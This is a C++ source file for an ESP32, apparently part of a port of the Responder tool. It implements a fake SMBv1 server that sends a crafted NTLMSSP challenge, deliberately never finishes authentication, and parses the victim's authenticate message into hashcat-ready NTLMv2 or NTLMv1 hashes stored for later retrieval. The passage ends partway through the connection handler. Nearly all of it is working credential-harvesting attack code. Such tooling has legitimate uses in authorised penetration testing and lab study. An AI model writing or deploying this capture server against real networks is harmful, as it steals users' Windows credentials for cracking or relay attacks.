// rESPonder32 — Step 4: Fake SMBv1 Server
//
// Listens on TCP 445. Completes exactly two SMBv1 exchanges:
//
//   1. Client sends SMB_COM_NEGOTIATE (0x72).
//      We respond with SMBNegoKerbAns-style packet that advertises
//      NT LM 0.12 and embeds an NTLMSSP Type 2 challenge.
//
//   2. Client sends SMB_COM_SESSION_SETUP_ANDX (0x73) containing
//      NTLMSSP Type 1 (negotiate). We reply STATUS_MORE_PROCESSING_REQUIRED
//      with our NTLMSSP Type 2 challenge blob.
//
//   3. Client sends a second SMB_COM_SESSION_SETUP_ANDX containing
//      the NTLMSSP Type 3 (authenticate) blob — this is the hash.
//      We log it and close.
//
// We never complete authentication. The Windows client keeps retrying until
// it gives up, but by then we have the NTLMv2 hash.
//
// Packet layout taken field-by-field from:
//   packets.py: SMBHeader, SMBNegoKerbAns (SMBSession1Data body), SMBSessEmpty
//   servers/SMB.py: SMB1.handle()
//
// NetBIOS Session Service framing: 4-byte header before every SMB PDU.
//   byte 0:   0x00 (SESSION MESSAGE)
//   bytes 1-3: big-endian payload length
//
// On Linux port 445 requires root. The server tries 445 first; if bind fails
// it falls back to 4450 so the test can run unprivileged.

#include <Arduino.h>
#include <WiFi.h>
#include <WiFiServer.h>
#include <WiFiClient.h>
#include <esp_random.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <poll.h>
#include <unistd.h>
#include <cstring>
#include <cstdio>
#include <cstdlib>
#include <vector>

// ---------------------------------------------------------------------------
// Config
// ---------------------------------------------------------------------------

static const char*    WIFI_SSID   = "YourSSID";
static const char*    WIFI_PASS   = "YourPassword";
static const uint16_t SMB_PORT    = 445;
static const uint16_t SMB_FALLBACK_PORT = 4450;

// Fake domain/machine names embedded in the NTLMSSP Type 2 challenge.
// Responder uses its configured Domain and MachineName here; we hardcode
// plausible-sounding values. Windows never verifies these against DNS.
static const char* SMB_DOMAIN      = "WORKGROUP";
static const char* SMB_MACHINE     = "FILESERVER01";
static const char* SMB_DOMAIN_NAME = "workgroup.local";

// ---------------------------------------------------------------------------
// Globals
// ---------------------------------------------------------------------------

static WiFiServer* smbServer = nullptr;
static uint8_t     smbChallenge[8];   // 8-byte random challenge, generated in setup()
static uint16_t    actualPort = SMB_PORT;

// Captured hashes — stored as raw hex strings for the /hashes endpoint (step 7).
static std::vector<String> capturedHashes;

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

static void detectHostIP(uint8_t out[4]) {
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) return;
    struct sockaddr_in dst{};
    dst.sin_family = AF_INET;
    dst.sin_port   = htons(53);
    inet_pton(AF_INET, "8.8.8.8", &dst.sin_addr);
    if (connect(s, (struct sockaddr*)&dst, sizeof(dst)) == 0) {
        struct sockaddr_in local{};
        socklen_t len = sizeof(local);
        if (getsockname(s, (struct sockaddr*)&local, &len) == 0) {
            uint8_t* b = (uint8_t*)&local.sin_addr.s_addr;
            out[0] = b[0]; out[1] = b[1]; out[2] = b[2]; out[3] = b[3];
        }
    }
    close(s);
}

// Read exactly n bytes from fd, blocking with poll. Returns n on success, -1 on
// error or timeout. The emulator sets client sockets non-blocking; raw recv
// without a poll loop drops partial reads.
static int recvAll(int fd, uint8_t* buf, int n, int timeout_ms = 5000) {
    int got = 0;
    while (got < n) {
        struct pollfd pfd{ fd, POLLIN, 0 };
        int r = poll(&pfd, 1, timeout_ms);
        if (r <= 0) return -1;
        int chunk = recv(fd, buf + got, n - got, 0);
        if (chunk <= 0) return -1;
        got += chunk;
    }
    return got;
}

// Write all bytes; return false on partial write.
static bool sendAll(int fd, const uint8_t* buf, int n) {
    int sent = 0;
    while (sent < n) {
        int r = ::send(fd, buf + sent, n - sent, 0);
        if (r <= 0) return false;
        sent += r;
    }
    return true;
}

// Read one NetBIOS-framed SMB PDU. Returns payload length (>= 0) into buf.
// Handles the optional 0x81 NetBIOS Session Request that some clients send first.
static int recvSMBPDU(int fd, uint8_t* buf, int bufsz) {
    while (true) {
        uint8_t hdr[4];
        if (recvAll(fd, hdr, 4) < 0) return -1;

        // 0x81 = NetBIOS Session Request (port 139 artefact; harmless on 445)
        // Reply with 0x82 Positive Session Response and re-read next PDU.
        if (hdr[0] == 0x81) {
            uint32_t slen = ((uint32_t)hdr[1] << 16) | ((uint32_t)hdr[2] << 8) | hdr[3];
            uint8_t tmp[256];
            recvAll(fd, tmp, (int)(slen < sizeof(tmp) ? slen : sizeof(tmp)));
            uint8_t resp[4] = { 0x82, 0x00, 0x00, 0x00 };
            sendAll(fd, resp, 4);
            continue;
        }

        if (hdr[0] != 0x00) return -1;  // not a Session Message
        uint32_t plen = ((uint32_t)hdr[1] << 16) | ((uint32_t)hdr[2] << 8) | hdr[3];
        if ((int)plen > bufsz) return -1;
        if (recvAll(fd, buf, (int)plen) < 0) return -1;
        return (int)plen;
    }
}

// Wrap payload in a 4-byte NetBIOS Session Service header and send.
static bool sendSMBPDU(int fd, const uint8_t* payload, int plen) {
    uint8_t hdr[4];
    hdr[0] = 0x00;
    hdr[1] = (uint8_t)((plen >> 16) & 0xFF);
    hdr[2] = (uint8_t)((plen >>  8) & 0xFF);
    hdr[3] = (uint8_t)( plen        & 0xFF);
    if (!sendAll(fd, hdr, 4)) return false;
    return sendAll(fd, payload, plen);
}

// Encode a string as UTF-16LE into dst. Returns bytes written.
static int encodeUTF16LE(const char* s, uint8_t* dst, int dstmax) {
    int w = 0;
    for (int i = 0; s[i] && w + 2 <= dstmax; i++) {
        dst[w++] = (uint8_t)s[i];
        dst[w++] = 0x00;
    }
    return w;
}

// Append a 16-bit little-endian NTLMSSP AvPair into buf[*pos].
// Returns false if the buffer would overflow.
static bool appendAvPair(uint8_t* buf, int bufsz, int* pos,
                          uint16_t avid, const char* value_utf8) {
    uint8_t tmp[256];
    int vlen = encodeUTF16LE(value_utf8, tmp, sizeof(tmp));
    if (*pos + 4 + vlen > bufsz) return false;
    buf[(*pos)++] = (uint8_t)(avid & 0xFF);
    buf[(*pos)++] = (uint8_t)(avid >> 8);
    buf[(*pos)++] = (uint8_t)(vlen & 0xFF);
    buf[(*pos)++] = (uint8_t)(vlen >> 8);
    memcpy(buf + *pos, tmp, vlen);
    *pos += vlen;
    return true;
}

// ---------------------------------------------------------------------------
// Packet builders
// ---------------------------------------------------------------------------

// Build the raw NTLMSSP Type 2 (Challenge) message into buf.
// Layout matches NTLMChallenge / SMBSession1Data from packets.py.
// Returns bytes written or -1.
static int buildNTLMChallenge(uint8_t* buf, int bufsz,
                               const uint8_t challenge[8]) {
    if (bufsz < 256) return -1;

    // The NTLM message body is all little-endian (MS-NLMP spec).

    // We pre-build the AvPairs block so we know its length before writing
    // the fixed header fields.
    uint8_t avpairs[256];
    int avlen = 0;

    // AvPairs order from packets.py / CLAUDE.md:
    //   MsvAvNbDomainName  (0x0002)
    //   MsvAvNbComputerName (0x0001)
    //   MsvAvDnsDomainName  (0x0004)
    //   MsvAvDnsComputerName (0x0003)
    //   MsvAvDnsTreeName    (0x0005)
    //   MsvAvEOL            (0x0000)
    appendAvPair(avpairs, sizeof(avpairs), &avlen, 0x0002, SMB_DOMAIN);
    appendAvPair(avpairs, sizeof(avpairs), &avlen, 0x0001, SMB_MACHINE);
    appendAvPair(avpairs, sizeof(avpairs), &avlen, 0x0004,
                 SMB_DOMAIN_NAME); // DnsDomainName — reuse domain
    appendAvPair(avpairs, sizeof(avpairs), &avlen, 0x0003,
                 (String(SMB_MACHINE) + "." + SMB_DOMAIN_NAME).c_str());
    appendAvPair(avpairs, sizeof(avpairs), &avlen, 0x0005, SMB_DOMAIN_NAME);
    // MsvAvEOL
    if (avlen + 4 > (int)sizeof(avpairs)) return -1;
    avpairs[avlen++] = 0x00; avpairs[avlen++] = 0x00;
    avpairs[avlen++] = 0x00; avpairs[avlen++] = 0x00;

    // Workstation name (UTF-16LE)
    uint8_t wsname[64];
    int wslen = encodeUTF16LE(SMB_DOMAIN, wsname, sizeof(wsname));

    // Fixed header size: signature(8) + MsgType(4) + TargetNameFields(8)
    //   + NegFlags(4) + ServerChallenge(8) + Reserved(8)
    //   + TargetInfoFields(8) + Version(8) = 56 bytes
    // Then: TargetName (wsname), then TargetInfo (avpairs)
    static const int NTLM_HDR = 56;
    int wsoff   = NTLM_HDR;           // TargetName follows immediately
    int avoff   = wsoff + wslen;       // TargetInfo follows TargetName
    int total   = avoff + avlen;

    if (total > bufsz) return -1;

    int w = 0;
    auto put8  = [&](uint8_t v)  { buf[w++] = v; };
    auto put16 = [&](uint16_t v) { buf[w++] = v & 0xFF; buf[w++] = v >> 8; };   // LE
    auto put32 = [&](uint32_t v) {
        buf[w++] = v & 0xFF; buf[w++] = (v >> 8) & 0xFF;
        buf[w++] = (v >> 16) & 0xFF; buf[w++] = (v >> 24) & 0xFF;
    };

    // Signature: "NTLMSSP\x00"
    const char* sig = "NTLMSSP";
    for (int i = 0; i < 7; i++) put8((uint8_t)sig[i]);
    put8(0x00);

    put32(0x00000002);  // MessageType = NTLMSSP_CHALLENGE

    // TargetNameFields (TargetName = workstation name = our domain string)
    put16((uint16_t)wslen);   // Len
    put16((uint16_t)wslen);   // MaxLen
    put32((uint32_t)wsoff);   // Offset

    // NegotiateFlags — from SMBSession1Data.NTLMSSPNtNegotiateFlags in packets.py.
    // 0xe2891215 in little-endian wire order:
    //   bytes: \x15\x82\x89\xe2 → NTLMSSP_NEGOTIATE_56 | NTLMSSP_NEGOTIATE_128 |
    //   NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY | NTLMSSP_TARGET_TYPE_DOMAIN |
    //   NTLMSSP_NEGOTIATE_NTLM | NTLMSSP_NEGOTIATE_SEAL | NTLMSSP_NEGOTIATE_SIGN
    // The value in packets.py is written as a little-endian int32, so we store
    // the same four bytes: 0x15, 0x82, 0x89, 0xe2.
    put8(0x15); put8(0x82); put8(0x89); put8(0xe2);

    // ServerChallenge — our 8-byte random
    for (int i = 0; i < 8; i++) put8(challenge[i]);

    // Reserved (8 zero bytes)
    for (int i = 0; i < 8; i++) put8(0x00);

    // TargetInfoFields
    put16((uint16_t)avlen);    // Len
    put16((uint16_t)avlen);    // MaxLen
    put32((uint32_t)avoff);    // Offset

    // Version (8 bytes) — from packets.py SMBSession1Data:
    //   VersionHigh=\x05 VersionLow=\x02 Built=\xce\x0e Reserved=\x00\x00\x00
    //   NTLMRevision=\x0f  (NTLM revision 15)
    put8(0x05); put8(0x02); put8(0xce); put8(0x0e);
    put8(0x00); put8(0x00); put8(0x00); put8(0x0f);

    // Payload: TargetName then TargetInfo
    memcpy(buf + w, wsname,  wslen); w += wslen;
    memcpy(buf + w, avpairs, avlen); w += avlen;

    return w;
}

// Wrap an NTLMSSP message in the SPNEGO / GSSAPI envelope that Windows expects
// in an SMB Session Setup response body. Matches the ASN.1 wrapper in
// SMBSession1Data.calculate() from packets.py.
//
// The envelope layout (just enough for our Type 2):
//   a1 [81 XX] 30 [81 XX] a0 03 0a 01 01    (negState = accept-incomplete)
//              a1 0e 06 0c <NTLMSSP OID>
//              a2 [81 XX] 04 [81 XX] <ntlm_msg>
//
// Returns bytes written or -1.
static int wrapInSPNEGO(const uint8_t* ntlm, int ntlmlen,
                         uint8_t* out, int outsz) {
    // NTLMSSP OID: 1.3.6.1.4.1.311.2.2.10
    static const uint8_t NTLMSSP_OID[] = {
        0x2b, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x02, 0x02, 0x0a
    };
    static const int OID_LEN = 10;

    // tag3 content (inner NTLM blob):
    //   04 [81 XX] <ntlm_msg>
    int tag3_content_len = 2 + ntlmlen;  // 04 + one-byte len (if <= 127) or 81+len
    bool ntlm_needs_2byte = (ntlmlen > 127);
    if (ntlm_needs_2byte) tag3_content_len = 3 + ntlmlen;

    // tag2 content (wrapper for tag3):
    //   a2 [81 XX] tag3_content
    int tag2_inner = 2 + tag3_content_len;
    if (tag3_content_len > 127) tag2_inner = 3 + tag3_content_len;

    // tag1 content (supported mech OID):
    //   a1 0e 06 0a <oid>
    int tag1_len = 2 + 2 + OID_LEN;  // a1 len 06 oidlen oid

    // tag0 content (negState=accept-incomplete):
    //   a0 03 0a 01 01
    int tag0_len = 5;

    // NegTokenResp inner content: tag0 + tag1 + tag2
    int negtoken_inner = tag0_len + tag1_len + tag2_inner;

    // 30 [len] <negtoken_inner>
    int seq_len = negtoken_inner;
    bool seq_needs_2byte = (seq_len > 127);

    // a1 [len] 30 ...
    int choice_inner = 2 + (seq_needs_2byte ? 3 : 2) + seq_len;
    bool choice_needs_2byte = (choice_inner > 127);

    int total = 2 + (choice_needs_2byte ? 3 : 2) + choice_inner;
    if (total > outsz) return -1;

    int w = 0;
    auto put8 = [&](uint8_t v) { out[w++] = v; };
    auto putLen = [&](int n) {
        if (n > 127) { put8(0x81); put8((uint8_t)n); }
        else         { put8((uint8_t)n); }
    };

    // a1 (choice tag = NegTokenResp)
    put8(0xa1); putLen(choice_inner);

    // 30 (SEQUENCE)
    put8(0x30); putLen(seq_len);

    // a0 03 0a 01 01  — negState = accept-incomplete (1)
    put8(0xa0); put8(0x03); put8(0x0a); put8(0x01); put8(0x01);

    // a1 0e — supportedMech
    put8(0xa1); put8((uint8_t)(2 + OID_LEN));
    put8(0x06); put8((uint8_t)OID_LEN);
    for (int i = 0; i < OID_LEN; i++) put8(NTLMSSP_OID[i]);

    // a2 — responseToken containing the NTLM blob
    put8(0xa2); putLen(tag3_content_len);
    put8(0x04); putLen(ntlmlen);
    memcpy(out + w, ntlm, ntlmlen); w += ntlmlen;

    return w;
}

// Build the SMBv1 32-byte header.
// Fields from SMBHeader in packets.py — values from SMB.py SMB1.handle().
// All multi-byte fields within the SMB header are little-endian.
static int buildSMBHeader(uint8_t* buf, int bufsz,
                           uint8_t cmd,
                           uint8_t flag1, uint16_t flag2,
                           uint32_t errorcode,
                           uint16_t pid, uint16_t uid, uint16_t tid, uint16_t mid) {
    if (bufsz < 32) return -1;
    int w = 0;

    // Magic: \xffSMB
    buf[w++] = 0xFF; buf[w++] = 'S'; buf[w++] = 'M'; buf[w++] = 'B';

    buf[w++] = cmd;    // Command

    // NTStatus (4 bytes LE)
    buf[w++] = (uint8_t)(errorcode & 0xFF);
    buf[w++] = (uint8_t)((errorcode >> 8) & 0xFF);
    buf[w++] = (uint8_t)((errorcode >> 16) & 0xFF);
    buf[w++] = (uint8_t)((errorcode >> 24) & 0xFF);

    buf[w++] = flag1;               // Flags1
    buf[w++] = (uint8_t)(flag2 & 0xFF); // Flags2 (LE)
    buf[w++] = (uint8_t)(flag2 >> 8);

    // PID High (2 bytes): always 0x0000
    buf[w++] = 0x00; buf[w++] = 0x00;

    // Signature (8 bytes): all zero for unauthenticated
    for (int i = 0; i < 8; i++) buf[w++] = 0x00;

    // Reserved (2 bytes)
    buf[w++] = 0x00; buf[w++] = 0x00;

    // TID, PID, UID, MID — all LE uint16
    buf[w++] = (uint8_t)(tid & 0xFF); buf[w++] = (uint8_t)(tid >> 8);
    buf[w++] = (uint8_t)(pid & 0xFF); buf[w++] = (uint8_t)(pid >> 8);
    buf[w++] = (uint8_t)(uid & 0xFF); buf[w++] = (uint8_t)(uid >> 8);
    buf[w++] = (uint8_t)(mid & 0xFF); buf[w++] = (uint8_t)(mid >> 8);

    return w;  // 32
}

// Build an SMB Negotiate Protocol Response (0x72).
// Matches SMBNegoKerbAns / SMBSession1Data from packets.py, used in
// the SMBv1 NTLMSSP code path in servers/SMB.py SMB1.handle().
//
// This packet advertises NT LM 0.12 as the accepted dialect and embeds
// an NTLMSSP Type 2 challenge in the SecurityBlob so the client can
// go straight to Session Setup with NTLMSSP (no separate challenge round).
//
// query: raw SMB negotiate request (after the 4-byte NetBIOS header)
// Returns bytes written into dst, or -1.
static int buildNegotiateResponse(const uint8_t* query, int qlen,
                                   uint8_t* dst,  int dstsz,
                                   const uint8_t challenge[8]) {
    if (qlen < 36) return -1;

    // SMB.py: pidcalc = data[30:32], midcalc = data[34:36]
    uint16_t pid = (uint16_t)query[30] | ((uint16_t)query[31] << 8);
    uint16_t mid = (uint16_t)query[34] | ((uint16_t)query[35] << 8);

    // Find the dialect index for "NT LM 0.12" by scanning the dialect list.
    // SMB.py:Parse_Nego_Dialect returns chr(i)+'\x00'.
    // Dialect list starts at byte 40 of the SMB payload (offset 36 = word count
    // area + byte count, plus 3 = word count(1) + byte count(2)).
    // Each dialect entry: \x02 + ascii string + \x00
    int dialect_idx = 0;
    {
        // WordCount is at query[36], ByteCount at query[37:39] LE
        // Dialect data starts at query[39]
        int pos = 39;
        int idx = 0;
        while (pos < qlen) {
            if (query[pos] != 0x02) { pos++; continue; }
            pos++;
            const char* start = (const char*)(query + pos);
            int slen = 0;
            while (pos + slen < qlen && query[pos + slen] != 0x00) slen++;
            if (memcmp(start, "NT LM 0.12", 10) == 0) {
                dialect_idx = idx;
            }
            pos += slen + 1;  // skip string + null
            idx++;
        }
    }

    // Build NTLMSSP Type 2 message
    uint8_t ntlm[512];
    int ntlmlen = buildNTLMChallenge(ntlm, sizeof(ntlm), challenge);
    if (ntlmlen < 0) return -1;

    // Wrap in SPNEGO
    uint8_t spnego[700];
    int spnegolen = wrapInSPNEGO(ntlm, ntlmlen, spnego, sizeof(spnego));
    if (spnegolen < 0) return -1;

    // SMB response body for 0x72 with extended security (SPNEGO blob):
    //
    // From packets.py SMBNegoKerbAns / SMB1 code path in SMB.py:
    //   WordCount: \x11 (17)
    //   DialectIndex (LE uint16): index of "NT LM 0.12"
    //   SecurityMode: \x03 (signing enabled, plaintext passwords disabled)
    //   MaxMpxCount (LE uint16): \x32\x00 = 50
    //   MaxCountLow: \x01 (1 outstanding request)
    //   MaxRawBuffer: \x00\x00\x04\x00 = 262144
    //   SessionKey: 4 zero bytes
    //   Capabilities: \xfd\xe3\x00\x80 = UNICODE|LARGE_FILES|NT_SMBS|RPC_REMOTE_APIS
    //                                    |NT_STATUS|LEVEL_II_OPLOCKS|LOCK_AND_READ
    //                                    |NT_FIND|EXT_SECURITY
    //   SystemTime: 8 bytes (we use zeros; clients don't enforce this)
    //   TimeZone: \xff\xff (UTC-0 sentinel)
    //   SecurityBlobLength: LE uint16 = spnegolen
    //   Reserved (ByteCount padding): \x00
    //   BCC (ByteCount LE uint16) = spnegolen
    //   SecurityBlob: <spnego bytes>

    uint8_t body[1024];
    int bw = 0;
    auto bput8  = [&](uint8_t v)  { if (bw < (int)sizeof(body)) body[bw++] = v; };
    auto bput16 = [&](uint16_t v) { bput8(v & 0xFF); bput8(v >> 8); };
    auto bput32 = [&](uint32_t v) {
        bput8(v & 0xFF); bput8((v >> 8) & 0xFF);
        bput8((v >> 16) & 0xFF); bput8((v >> 24) & 0xFF);
    };

    bput8(0x11);                         // WordCount = 17
    bput16((uint16_t)dialect_idx);       // DialectIndex
    bput8(0x03);                         // SecurityMode: signing capable
    bput16(0x0032);                      // MaxMpxCount = 50
    bput8(0x01);                         // MaxCountLow = 1
    bput32(0x00040000);                  // MaxRawBuffer = 262144
    bput32(0x00000000);                  // SessionKey = 0
    // Capabilities: \xfd\xe3\x00\x80 as LE → 0x8000e3fd
    bput8(0xfd); bput8(0xe3); bput8(0x00); bput8(0x80);
    // SystemTime (Windows FILETIME, 8 bytes) — zero is fine for our purposes
    for (int i = 0; i < 8; i++) bput8(0x00);
    bput16(0xffff);                      // TimeZone (minutes west of UTC): -1 sentinel
    bput16((uint16_t)spnegolen);         // SecurityBlobLength
    bput8(0x00);                         // Reserved (1 byte before ByteCount)
    bput16((uint16_t)spnegolen);         // ByteCount (BCC)

    if (bw + spnegolen > (int)sizeof(body)) return -1;
    memcpy(body + bw, spnego, spnegolen);
    bw += spnegolen;

    // Assemble: 32-byte SMB header + body
    if (32 + bw > dstsz) return -1;
    int hw = buildSMBHeader(dst, dstsz,
                             0x72,          // cmd = SMB_COM_NEGOTIATE
                             0x88,          // flag1: from SMB.py \x88
                             0x01c8,        // flag2: from SMB.py \x01\xc8 LE
                             0x00000000,    // errorcode = STATUS_SUCCESS
                             pid, 0, 0, mid);
    if (hw < 0) return -1;
    memcpy(dst + hw, body, bw);
    return hw + bw;
}

// Build the SMB Session Setup AndX Response (0x73) carrying the NTLMSSP
// Type 2 challenge, with NTStatus STATUS_MORE_PROCESSING_REQUIRED (0xc0000016).
//
// This is the packet Responder sends in the first 0x73 exchange. It tells
// the client "I need more data" while embedding our challenge in the blob.
//
// From servers/SMB.py SMB1.handle() and packets.py SMBSession1Data:
//   WordCount: \x04
//   AndXCommand: \xff (no chained command)
//   Reserved: \x00
//   AndXOffset: computed (LE uint16)
//   Action: \x00\x00
//   SecurityBlobLength: LE uint16 = spnegolen
//   ByteCount (BCC): LE uint16 = spnegolen + trailing strings
//   SecurityBlob: <spnego>
//   NativeOS: "Windows Server 2003 3790 Service Pack 2" (UTF-16LE)
//   NativeOS terminator: \x00\x00
//   NativeLAN: "Windows Server 2003 5.2" (UTF-16LE)
//   NativeLAN terminator: \x00\x00
static int buildSessionSetupChallenge(const uint8_t* query, int qlen,
                                       uint8_t* dst,  int dstsz,
                                       const uint8_t challenge[8]) {
    if (qlen < 36) return -1;

    uint16_t pid = (uint16_t)query[30] | ((uint16_t)query[31] << 8);
    uint16_t mid = (uint16_t)query[34] | ((uint16_t)query[35] << 8);

    // Random UID for this session
    uint16_t uid = (uint16_t)(esp_random() & 0xFFFF);
    if (uid == 0) uid = 0x0100;

    // Build NTLMSSP Type 2
    uint8_t ntlm[512];
    int ntlmlen = buildNTLMChallenge(ntlm, sizeof(ntlm), challenge);
    if (ntlmlen < 0) return -1;

    uint8_t spnego[700];
    int spnegolen = wrapInSPNEGO(ntlm, ntlmlen, spnego, sizeof(spnego));
    if (spnegolen < 0) return -1;

    // NativeOS and NativeLAN strings (UTF-16LE) — from packets.py SMBSession1Data
    uint8_t nativeos[128], nativelan[64];
    int noslen = encodeUTF16LE("Windows Server 2003 3790 Service Pack 2",
                                nativeos, sizeof(nativeos));
    int nlanlen = encodeUTF16LE("Windows Server 2003 5.2",
                                 nativelan, sizeof(nativelan));

    // BCC = spnegolen + nativeos + 2-byte terminator + nativelan + 2-byte terminator
    int bcc = spnegolen + noslen + 2 + nlanlen + 2;

    // spnego is at most ~700 bytes; NativeOS UTF-16LE is at most ~80 bytes;
    // NativeLAN ~48 bytes; plus fixed fields. 3072 is a comfortable ceiling.
    // GCC 16's inliner sees the conditional guard in bput8 and still warns about
    // a theoretical overflow at sizeof(body)+1; the pragma silences that.
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Warray-bounds"
#pragma GCC diagnostic ignored "-Wstringop-overflow"
    uint8_t body[3072];
    int bw = 0;
    auto bput8  = [&](uint8_t v)  { if (bw < (int)sizeof(body)) body[bw++] = v; };
    auto bput16 = [&](uint16_t v) { bput8(v & 0xFF); bput8(v >> 8); };

    // WordCount header byte + words (before AndXOffset calculation):
    //   Wordcount(1) + AndXCmd(1) + Reserved(1) + AndXOffset(2)
    //   + Action(2) + SecBlobLen(2) = 9 bytes so far
    // AndXOffset = 32 (hdr) + 9 + bcc_len = 32 + 9 + bcc
    // But AndXOffset in Responder points past the end of the packet body,
    // which effectively says "no next AndX command follows".
    int andxoff = 32 + 9 + bcc;

    bput8(0x04);                    // WordCount = 4
    bput8(0xff);                    // AndXCommand = 0xff (none)
    bput8(0x00);                    // Reserved
    bput16((uint16_t)andxoff);     // AndXOffset
    bput16(0x0000);                 // Action = 0 (not logged in)
    bput16((uint16_t)spnegolen);   // SecurityBlobLength
    bput16((uint16_t)bcc);         // ByteCount

    // SecurityBlob
    if (bw + spnegolen > (int)sizeof(body)) return -1;
    memcpy(body + bw, spnego, spnegolen); bw += spnegolen;

    // NativeOS (UTF-16LE) + \x00\x00
    memcpy(body + bw, nativeos, noslen); bw += noslen;
    bput8(0x00); bput8(0x00);

    // NativeLAN (UTF-16LE) + \x00\x00
    memcpy(body + bw, nativelan, nlanlen); bw += nlanlen;
    bput8(0x00); bput8(0x00);

#pragma GCC diagnostic pop

    if (32 + bw > dstsz) return -1;
    int hw = buildSMBHeader(dst, dstsz,
                             0x73,          // cmd = SMB_COM_SESSION_SETUP_ANDX
                             0x88,          // flag1
                             0x01c8,        // flag2
                             0xc0000016,    // STATUS_MORE_PROCESSING_REQUIRED
                             pid, uid, 0, mid);
    if (hw < 0) return -1;
    memcpy(dst + hw, body, bw);
    return hw + bw;
}

// Parse an NTLMSSP Type 3 message and format as hashcat NTLMv2:
//   user::domain:challenge_hex:NTHash[:32]:NTHash[32:]
// From ParseSMBHash in servers/SMB.py and CLAUDE.md hash formatter notes.
//
// SSPIStart is the offset of "NTLMSSP\x00" within data.
// Returns the formatted string, or empty string on failure.
static String parseNTLMv2Hash(const uint8_t* data, int dlen,
                               const uint8_t challenge[8]) {
    int sspi_start = -1;
    for (int i = 0; i <= dlen - 8; i++) {
        if (memcmp(data + i, "NTLMSSP\x00", 8) == 0) {
            sspi_start = i;
            break;
        }
    }
    if (sspi_start < 0) return "";

    const uint8_t* s = data + sspi_start;
    int slen = dlen - sspi_start;
    // We read up to s[41] (UserOffset high byte), so we need at least 44 bytes.
    if (slen < 44) return "";

    // Offsets from ParseSMBHash in SMB.py — all relative to sspi_start:
    uint16_t lm_len    = (uint16_t)s[14] | ((uint16_t)s[15] << 8);
    uint16_t lm_off    = (uint16_t)s[16] | ((uint16_t)s[17] << 8);
    uint16_t nt_len    = (uint16_t)s[20] | ((uint16_t)s[21] << 8);
    uint16_t nt_off    = (uint16_t)s[24] | ((uint16_t)s[25] << 8);
    uint16_t dom_len   = (uint16_t)s[28] | ((uint16_t)s[29] << 8);
    uint16_t dom_off   = (uint16_t)s[32] | ((uint16_t)s[33] << 8);
    uint16_t user_len  = (uint16_t)s[36] | ((uint16_t)s[37] << 8);
    uint16_t user_off  = (uint16_t)s[40] | ((uint16_t)s[41] << 8);

    // Cast to int for the comparison — uint16_t arithmetic wraps and can
    // produce false negatives when nt_off + nt_len overflows 65535.
    if ((int)lm_off  + lm_len  > slen) return "";
    if ((int)nt_off  + nt_len  > slen) return "";
    if ((int)dom_off + dom_len > slen) return "";
    if ((int)user_off + user_len > slen) return "";

    // Decode username and domain from UTF-16LE (ASCII plane only)
    auto decodeUTF16 = [](const uint8_t* p, int n, char* out, int outsz) {
        int w = 0;
        for (int i = 0; i + 1 < n && w + 1 < outsz; i += 2) {
            char c = (char)p[i];
            out[w++] = (c >= 32 && c < 127) ? c : '?';
        }
        out[w] = '\0';
    };

    char username_buf[128] = {}, domain_buf[128] = {};
    decodeUTF16(s + user_off, user_len, username_buf, sizeof(username_buf));
    decodeUTF16(s + dom_off,  dom_len,  domain_buf,  sizeof(domain_buf));
    String username(username_buf);
    String domain(domain_buf);

    // Hex-encode challenge
    char chal_hex[17] = {};
    for (int i = 0; i < 8; i++)
        snprintf(chal_hex + i * 2, 3, "%02x", challenge[i]);

    // NTLMv2: Responder uses NthashLen > 60 (ParseSMBHash). The NTLMv2 blob
    // is at minimum 16 (NTProofStr) + 28 (fixed blob header) + variable = 44+
    // bytes, making > 60 a conservative but reliable threshold. Values 25-60
    // would be malformed; both conditions below leave them unformatted.
    if (nt_len > 60) {
        // hex-encode the NtHash blob
        String nt_hex;
        for (int i = 0; i < nt_len; i++) {
            char tmp[3];
            snprintf(tmp, sizeof(tmp), "%02X", s[nt_off + i]);
            nt_hex += tmp;
        }
        // hashcat format: user::domain:chal:NTHash[:32]:NTHash[32:]
        return username + "::" + domain + ":" + chal_hex + ":" +
               nt_hex.substring(0, 32) + ":" + nt_hex.substring(32);
    }

    if (nt_len == 24) {
        // NTLMv1
        String lm_hex, nt_hex;
        for (int i = 0; i < lm_len; i++) {
            char tmp[3]; snprintf(tmp, sizeof(tmp), "%02X", s[lm_off + i]);
            lm_hex += tmp;
        }
        for (int i = 0; i < nt_len; i++) {
            char tmp[3]; snprintf(tmp, sizeof(tmp), "%02X", s[nt_off + i]);
            nt_hex += tmp;
        }
        // NTLMv1 hashcat: user::host:LM:NT:chal
        return username + "::" + domain + ":" + lm_hex + ":" + nt_hex + ":" + chal_hex;
    }

    return "";  // anonymous or incomplete
}

// ---------------------------------------------------------------------------
// Connection handler
// ---------------------------------------------------------------------------

static void handleSMBClient(WiFiClient client, const char* client_ip) {
    Serial.printf("[SMB] Connection from %s\n", client_ip);

    int fd = client.fd();
    uint8_t buf[4096];
    uint8_t resp[4096];

    // Step 1: receive Negotiate
    int plen = recvSMBPDU(fd, buf, sizeof(buf));
    if (plen < 10) {
        Serial.printf("[SMB] Negotiate: short read or error from %s\n", client_ip);
        return;
    }

    // buf[4] is SMB command — check magic and command
    if (buf[0] != 0xFF || buf[1] != 'S' || buf[2] != 'M' || buf[3] != 'B') {
        Serial.printf("[SMB] Not SMBv1 magic from %s\n", client_ip);
        return;
    }
    if (buf[4] != 0x72) {
        Serial.printf("[SMB] Expected NEGOTIATE (0x72), got 0x%02x from %s\n",
                      buf[4], client_ip);
        return;
    }

    Serial.printf("[SMB] Negotiate from %s\n", client_ip);

    int rlen = buildNegotiateResponse(buf, plen, resp, sizeof(resp), smbChallenge);
    if (rlen < 0) {
        Serial.printf("[SMB] Failed to build Negotiate response for %s\n", client_ip);
        return;
    }
    if (!sendSMBPDU(fd, resp, rlen)) {
        Serial.printf("[SMB] Failed to send Negotiate response to %s\n", client_ip);
        return;
    }

    Serial.printf("[SMB] Challenge sent to %s\n", client_ip);

    // Step 2: receive first Session Setup (NTLMSSP Type 1)
    plen = recvSMBPDU(fd, buf, sizeof(buf));
    if (plen < 10) {
        Serial.printf("[SMB] SessionSetup: short read from %s\n", client_ip);
        return;
    }
    if (buf[4] != 0x73) {
